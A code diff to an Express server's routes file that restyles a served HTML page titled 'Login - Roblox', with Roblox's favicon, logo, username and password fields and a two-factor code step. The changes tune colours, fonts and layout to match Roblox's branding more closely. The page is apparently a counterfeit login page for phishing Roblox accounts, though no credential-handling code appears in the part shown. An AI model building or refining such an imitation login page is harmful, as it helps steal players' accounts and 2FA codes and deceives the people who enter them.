@@ -1890,7 +1890,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login - Roblox</title>
     <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;500;600;700&display=swap">
     <style>
         * {
             margin: 0;
@@ -1899,49 +1899,42 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
         
         body {
-            font-family: "Source Sans Pro", Arial, sans-serif;
-            background-color: #00a2ff;
-            background: linear-gradient(45deg, #00a2ff, #0080ff);
+            font-family: "Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #00A2FF 0%, #0080FF 100%);
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
         
         .header {
-            background: #00b2ff;
-            padding: 12px 0;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        
-        .header-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            align-items: center;
-            padding: 0 20px;
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            z-index: 10;
         }
         
         .logo-container {
             display: flex;
             align-items: center;
-            color: white;
             text-decoration: none;
         }
         
         .logo-icon {
-            width: 32px;
-            height: 32px;
+            width: 28px;
+            height: 28px;
             background: white;
-            border-radius: 4px;
+            border-radius: 6px;
             margin-right: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            color: #00b2ff;
-            font-size: 18px;
+            color: #00A2FF;
+            font-size: 16px;
         }
         
         .logo-text {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 700;
             color: white;
         }
@@ -1950,17 +1943,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: calc(100vh - 56px);
+            flex: 1;
             padding: 20px;
         }
         
         .login-container {
             background: white;
             border-radius: 8px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-            padding: 48px 40px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
+            padding: 40px;
             width: 100%;
             max-width: 400px;
+            position: relative;
         }
         
         .login-header {
@@ -1969,66 +1963,67 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
         
         .login-title {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
-            color: #191b1d;
+            color: #393B3D;
             margin-bottom: 8px;
         }
         
         .login-subtitle {
-            color: #656c75;
+            color: #606770;
             font-size: 14px;
+            font-weight: 400;
         }
         
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
         
         .form-label {
             display: block;
-            margin-bottom: 8px;
-            color: #191b1d;
+            margin-bottom: 6px;
+            color: #393B3D;
             font-weight: 600;
-            font-size: 14px;
+            font-size: 13px;
         }
         
         .form-input {
             width: 100%;
             padding: 12px 16px;
-            border: 2px solid #e1e5e9;
-            border-radius: 6px;
-            font-size: 16px;
-            color: #191b1d;
+            border: 1px solid #c3c4c7;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #393B3D;
             background: white;
-            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
         }
         
         .form-input:focus {
             outline: none;
-            border-color: #00b2ff;
-            box-shadow: 0 0 0 3px rgba(0, 178, 255, 0.1);
+            border-color: #00A2FF;
+            box-shadow: 0 0 0 2px rgba(0, 162, 255, 0.2);
         }
         
         .form-input::placeholder {
-            color: #9ca3af;
+            color: #868E96;
         }
         
         .login-button {
             width: 100%;
-            padding: 14px;
-            background: #00b2ff;
+            padding: 12px;
+            background: #00A2FF;
             color: white;
             border: none;
-            border-radius: 6px;
+            border-radius: 4px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s ease;
-            margin-bottom: 16px;
+            transition: background-color 0.15s ease-in-out;
+            margin-bottom: 20px;
         }
         
         .login-button:hover {
-            background: #0095cc;
+            background: #0091E6;
         }
         
         .login-button:disabled {
@@ -2050,13 +2045,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
         .two-factor-title {
             font-size: 18px;
             font-weight: 600;
-            color: #191b1d;
+            color: #393B3D;
             margin-bottom: 8px;
             text-align: center;
         }
         
         .two-factor-desc {
-            color: #656c75;
+            color: #606770;
             font-size: 14px;
             text-align: center;
             margin-bottom: 20px;
@@ -2067,7 +2062,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             border: 1px solid #fecaca;
             color: #dc2626;
             padding: 12px;
-            border-radius: 6px;
+            border-radius: 4px;
             font-size: 14px;
             margin-bottom: 16px;
             display: none;
@@ -2078,79 +2073,51 @@ export async function registerRoutes(app: Express): Promise<Server> {
             border: 1px solid #bbf7d0;
             color: #16a34a;
             padding: 12px;
-            border-radius: 6px;
+            border-radius: 4px;
             font-size: 14px;
             margin-bottom: 16px;
             display: none;
         }
         
-        .form-links {
+        .forgot-password {
             text-align: center;
-            margin-top: 24px;
+            margin-bottom: 20px;
         }
         
-        .form-links a {
-            color: #00b2ff;
+        .forgot-password a {
+            color: #00A2FF;
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
         }
         
-        .form-links a:hover {
+        .forgot-password a:hover {
             text-decoration: underline;
         }
         
-        .divider {
+        .signup-section {
             text-align: center;
-            margin: 24px 0;
-            position: relative;
-        }
-        
-        .divider::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: #e1e5e9;
-        }
-        
-        .divider span {
-            background: white;
-            color: #656c75;
-            padding: 0 16px;
+            color: #606770;
             font-size: 14px;
         }
         
-        .signup-link {
-            text-align: center;
-            margin-top: 24px;
-            padding-top: 24px;
-            border-top: 1px solid #e1e5e9;
-            color: #656c75;
-            font-size: 14px;
-        }
-        
-        .signup-link a {
-            color: #00b2ff;
+        .signup-section a {
+            color: #00A2FF;
             text-decoration: none;
             font-weight: 600;
         }
         
-        .signup-link a:hover {
+        .signup-section a:hover {
             text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <div class="header-content">
-            <a href="#" class="logo-container">
-                <div class="logo-icon">R</div>
-                <div class="logo-text">Roblox</div>
-            </a>
-        </div>
+        <a href="#" class="logo-container">
+            <div class="logo-icon">R</div>
+            <div class="logo-text">Roblox</div>
+        </a>
     </div>
     
     <div class="main-container">
@@ -2187,11 +2154,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 </div>
             </form>
             
-            <div class="form-links">
+            <div class="forgot-password">
                 <a href="#">Forgot your password?</a>
             </div>
             
-            <div class="signup-link">
+            <div class="signup-section">
                 Don't have an account? <a href="#">Sign up</a>
             </div>
         </div>
